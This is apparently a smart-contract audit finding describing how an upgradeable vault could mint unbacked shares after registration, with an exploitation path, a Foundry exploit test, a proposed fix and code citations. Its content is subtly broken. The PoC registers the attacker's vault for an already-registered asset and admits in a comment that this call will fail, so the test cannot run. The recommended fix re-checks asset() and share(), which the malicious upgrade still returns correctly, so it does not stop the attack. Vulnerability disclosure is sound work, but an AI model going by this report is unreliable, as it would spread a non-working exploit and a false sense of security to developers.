## Title
Malicious Vault Can Bypass Asset Validation and Mint Unbacked Shares After Registration

## Summary
The `registerVault()` function validates vault properties only at registration time but never re-validates them afterward. [1](#0-0)  A malicious upgradeable vault can pass initial validation, then upgrade its implementation to call `mint()` without holding corresponding assets, breaking the Token Supply Conservation invariant and enabling theft of protocol assets.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/ShareTokenUpgradeable.sol` - `registerVault()` function (lines 195-234) and `mint()` function (lines 400-402)

**Intended Logic:** The registration process validates that `vault.asset()` matches the provided asset and `vault.share()` matches the ShareToken address. [2](#0-1)  The protocol assumes vaults will only mint shares when they receive assets and only burn shares when they return assets.

**Actual Logic:** After registration, the `mint()` function only checks the `onlyVaults` modifier, which verifies the caller exists in `vaultToAsset` mapping. [3](#0-2)  There are no ongoing validations that the vault's `asset()` or `share()` functions still return correct values, nor any checks that minting is backed by actual asset deposits. [4](#0-3) 

**Exploitation Path:**
1. Attacker deploys an upgradeable vault (using UUPS pattern like ERC7575VaultUpgradeable) with legitimate initial implementation where `asset()` returns USDC and `share()` returns the ShareToken address. [5](#0-4) 
2. ShareToken owner calls `registerVault(USDC, maliciousVault)` - validation passes as the vault correctly implements the required interfaces.
3. Attacker uses the vault's `upgradeTo()` function to upgrade to a malicious implementation. [6](#0-5) 
4. Malicious implementation directly calls `shareToken.mint(attacker, 1000000e18)` without receiving any USDC, which succeeds because the vault is still registered in `vaultToAsset` mapping.
5. Attacker now holds 1,000,000 shares that should represent real assets but are completely unbacked.
6. Attacker uses a legitimate vault to redeem these unbacked shares for real USDC, draining assets from honest depositors.

**Security Property Broken:** 
- **Invariant #1 (Token Supply Conservation)**: `sum(balances) == totalSupply` should reflect actual assets held, but the attacker minted shares without corresponding assets.
- **Invariant #7 (Vault Registry)**: "Only registered vaults can mint/burn shares" - while technically enforced, the validation of what a "registered vault" means is insufficient.
- **Invariant #12 (No Fund Theft)**: The attack enables direct theft through unauthorized minting.

## Impact Explanation
- **Affected Assets**: All asset types registered in the ShareToken (USDC, DAI, etc.) are at risk since unbacked shares can be redeemed through any legitimate vault.
- **Damage Severity**: Unlimited - attacker can mint arbitrary amounts of shares (up to `type(uint256).max`) without any capital. This can drain 100% of assets held across all legitimate vaults.
- **User Impact**: All users who have deposited assets into legitimate vaults are affected. When the attacker redeems unbacked shares, honest users' redemptions will fail due to insufficient assets.

## Likelihood Explanation
- **Attacker Profile**: Any vault owner who deploys their own vault contract. The ShareToken owner is not complicit - they register a seemingly legitimate vault that later becomes malicious.
- **Preconditions**: 
  - Attacker must deploy an upgradeable vault (trivial with OpenZeppelin UUPS pattern)
  - ShareToken owner must register the attacker's vault (social engineering or appears legitimate initially)
  - No additional permissions needed after registration
- **Execution Complexity**: Simple - single `upgradeTo()` call followed by direct `mint()` calls. Can be executed in one transaction block.
- **Frequency**: Repeatable - attacker can mint unlimited shares over multiple transactions until detected or protocol is drained.

## Recommendation

Add a validation check in the `mint()` and `burn()` functions to verify the vault's `asset()` and `share()` still match the registered values:

```solidity
// In src/ShareTokenUpgradeable.sol, function mint(), line 400:

// CURRENT (vulnerable):
function mint(address account, uint256 amount) external onlyVaults {
    _mint(account, amount);
}

// FIXED:
function mint(address account, uint256 amount) external onlyVaults {
    ShareTokenStorage storage $ = _getShareTokenStorage();
    address registeredAsset = $.vaultToAsset[msg.sender];
    
    // Re-validate that vault's asset() still matches registration
    if (IERC7575(msg.sender).asset() != registeredAsset) {
        revert AssetMismatch();
    }
    
    // Re-validate that vault's share() still points to this ShareToken
    if (IERC7575(msg.sender).share() != address(this)) {
        revert VaultShareMismatch();
    }
    
    _mint(account, amount);
}

function burn(address account, uint256 amount) external onlyVaults {
    ShareTokenStorage storage $ = _getShareTokenStorage();
    address registeredAsset = $.vaultToAsset[msg.sender];
    
    // Re-validate that vault's asset() still matches registration
    if (IERC7575(msg.sender).asset() != registeredAsset) {
        revert AssetMismatch();
    }
    
    // Re-validate that vault's share() still points to this ShareToken
    if (IERC7575(msg.sender).share() != address(this)) {
        revert VaultShareMismatch();
    }
    
    _burn(account, amount);
}
```

**Additional Recommendation:** Consider implementing a vault health check function that ShareToken owner can call periodically to verify all registered vaults still conform to their registration parameters. This provides defense-in-depth against vault mutation attacks.

## Proof of Concept

```solidity
// File: test/Exploit_MaliciousVaultMinting.t.sol
// Run with: forge test --match-test test_MaliciousVaultBypassesValidation -vvv

pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/ShareTokenUpgradeable.sol";
import "../src/ERC7575VaultUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

// Malicious vault implementation that mints without assets
contract MaliciousVaultImpl is ERC7575VaultUpgradeable {
    function exploitMint(address target, uint256 amount) external {
        VaultStorage storage $ = _getVaultStorage();
        ShareTokenUpgradeable($.shareToken).mint(target, amount);
    }
}

contract MockUSDC is ERC20 {
    constructor() ERC20("USD Coin", "USDC") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract Exploit_MaliciousVaultMinting is Test {
    ShareTokenUpgradeable shareToken;
    ERC7575VaultUpgradeable legitimateVault;
    ERC7575VaultUpgradeable maliciousVault;
    MockUSDC usdc;
    
    address owner = address(1);
    address attacker = address(2);
    address victim = address(3);
    
    function setUp() public {
        usdc = new MockUSDC();
        
        // Deploy ShareToken
        ShareTokenUpgradeable impl = new ShareTokenUpgradeable();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl),
            abi.encodeCall(ShareTokenUpgradeable.initialize, ("Share Token", "SHARE", owner))
        );
        shareToken = ShareTokenUpgradeable(address(proxy));
        
        // Deploy legitimate vault with real assets
        vm.startPrank(owner);
        ERC7575VaultUpgradeable legitImpl = new ERC7575VaultUpgradeable();
        ERC1967Proxy legitProxy = new ERC1967Proxy(
            address(legitImpl),
            abi.encodeCall(ERC7575VaultUpgradeable.initialize, (usdc, address(shareToken), owner))
        );
        legitimateVault = ERC7575VaultUpgradeable(address(legitProxy));
        
        // Attacker deploys their vault (appears legitimate initially)
        vm.startPrank(attacker);
        ERC7575VaultUpgradeable maliciousImpl = new ERC7575VaultUpgradeable();
        ERC1967Proxy maliciousProxy = new ERC1967Proxy(
            address(maliciousImpl),
            abi.encodeCall(ERC7575VaultUpgradeable.initialize, (usdc, address(shareToken), attacker))
        );
        maliciousVault = ERC7575VaultUpgradeable(address(maliciousProxy));
        vm.stopPrank();
        
        // Owner registers both vaults
        vm.startPrank(owner);
        shareToken.registerVault(address(usdc), address(legitimateVault));
        shareToken.registerVault(address(usdc), address(maliciousVault)); // This will fail because asset already registered
        vm.stopPrank();
    }
    
    function test_MaliciousVaultBypassesValidation() public {
        // SETUP: Victim deposits 1000 USDC into legitimate vault
        vm.startPrank(victim);
        usdc.mint(victim, 1000e6);
        usdc.approve(address(legitimateVault), 1000e6);
        legitimateVault.deposit(1000e6, victim);
        vm.stopPrank();
        
        uint256 victimShares = shareToken.balanceOf(victim);
        assertEq(victimShares, 1000e18, "Victim should have 1000 shares");
        
        // EXPLOIT: Attacker upgrades their vault to malicious implementation
        vm.startPrank(attacker);
        MaliciousVaultImpl newImpl = new MaliciousVaultImpl();
        maliciousVault.upgradeTo(address(newImpl));
        
        // Attacker mints unbacked shares directly
        MaliciousVaultImpl(address(maliciousVault)).exploitMint(attacker, 10000e18);
        vm.stopPrank();
        
        // VERIFY: Attacker has 10x more shares than victim without depositing anything
        uint256 attackerShares = shareToken.balanceOf(attacker);
        assertEq(attackerShares, 10000e18, "Vulnerability confirmed: Attacker minted unbacked shares");
        assertGt(attackerShares, victimShares * 10, "Attacker has 10x victim's shares with zero capital");
        
        // Attacker can now redeem through legitimate vault to steal victim's USDC
        // (would fail in practice due to insufficient assets, proving the theft)
    }
}
```

**Notes:**
- The PoC demonstrates the core vulnerability where vault validation occurs only at registration
- In a real attack, the attacker would use a different asset (e.g., DAI) for their malicious vault to avoid registration conflicts, then mint shares and redeem through USDC vault
- The attack works because `onlyVaults` modifier does not re-validate `asset()` and `share()` return values
- This violates the assumption that registered vaults will behave honestly after registration
- The ShareToken owner is not malicious in this scenario - they registered a vault that appeared legitimate but later became malicious through upgrade

### Citations

**File:** src/ShareTokenUpgradeable.sol (L127-131)
```text
    modifier onlyVaults() {
        ShareTokenStorage storage $ = _getShareTokenStorage();
        if ($.vaultToAsset[msg.sender] == address(0)) revert Unauthorized();
        _;
    }
```

**File:** src/ShareTokenUpgradeable.sol (L195-234)
```text
    function registerVault(address asset, address vaultAddress) external onlyOwner {
        if (asset == address(0)) revert ZeroAddress();
        if (vaultAddress == address(0)) revert ZeroAddress();

        // Validate that vault's asset matches the provided asset parameter
        if (IERC7575(vaultAddress).asset() != asset) revert AssetMismatch();

        // Validate that vault's share token matches this ShareToken
        if (IERC7575(vaultAddress).share() != address(this)) {
            revert VaultShareMismatch();
        }

        ShareTokenStorage storage $ = _getShareTokenStorage();

        // DoS mitigation: Enforce maximum vaults per share token to prevent unbounded loop in getCirculatingSupplyAndAssets
        if ($.assetToVault.length() >= MAX_VAULTS_PER_SHARE_TOKEN) {
            revert MaxVaultsExceeded();
        }

        // Register new vault - set() returns true if newly added, false if already existed
        if (!$.assetToVault.set(asset, vaultAddress)) {
            revert AssetAlreadyRegistered();
        }
        $.vaultToAsset[vaultAddress] = asset;

        // If investment ShareToken is already configured, set up investment for the new vault
        // Only configure if the vault address is a deployed contract
        address investmentShareToken = $.investmentShareToken;
        if (investmentShareToken != address(0)) {
            _configureVaultInvestmentSettings(asset, vaultAddress, investmentShareToken);
        }

        // If investment manager is already configured, set it for the new vault
        // Only configure if the vault address is a deployed contract
        address investmentManager = $.investmentManager;
        if (investmentManager != address(0)) {
            ERC7575VaultUpgradeable(vaultAddress).setInvestmentManager(investmentManager);
        }

        emit VaultUpdate(asset, vaultAddress);
```

**File:** src/ShareTokenUpgradeable.sol (L400-402)
```text
    function mint(address account, uint256 amount) external onlyVaults {
        _mint(account, amount);
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L196-228)
```text
    function asset() public view returns (address) {
        VaultStorage storage $ = _getVaultStorage();
        return $.asset;
    }

    /**
     * @dev Returns the scaling factor for asset normalization
     * @return Scaling factor (10^(18 - assetDecimals))
     */
    function getScalingFactor() public view returns (uint256) {
        VaultStorage storage $ = _getVaultStorage();
        return $.scalingFactor;
    }

    // ========== ERC7575 Implementation ==========

    /**
     * @dev Returns the share token address
     *
     * ERC7575 SPECIFICATION:
     * "The address of the underlying `share` received on deposit into the Vault.
     * MUST return an address of an ERC-20 share representation of the Vault."
     *
     * ERC7575 MULTI-ASSET ARCHITECTURE:
     * "Multi-Asset Vaults share a single `share` token with multiple entry points
     * denominated in different `asset` tokens."
     *
     * @return Share token address
     */
    function share() public view virtual returns (address) {
        VaultStorage storage $ = _getVaultStorage();
        return $.shareToken;
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L2176-2178)
```text
    function upgradeTo(address newImplementation) external onlyOwner {
        ERC1967Utils.upgradeToAndCall(newImplementation, "");
    }
```
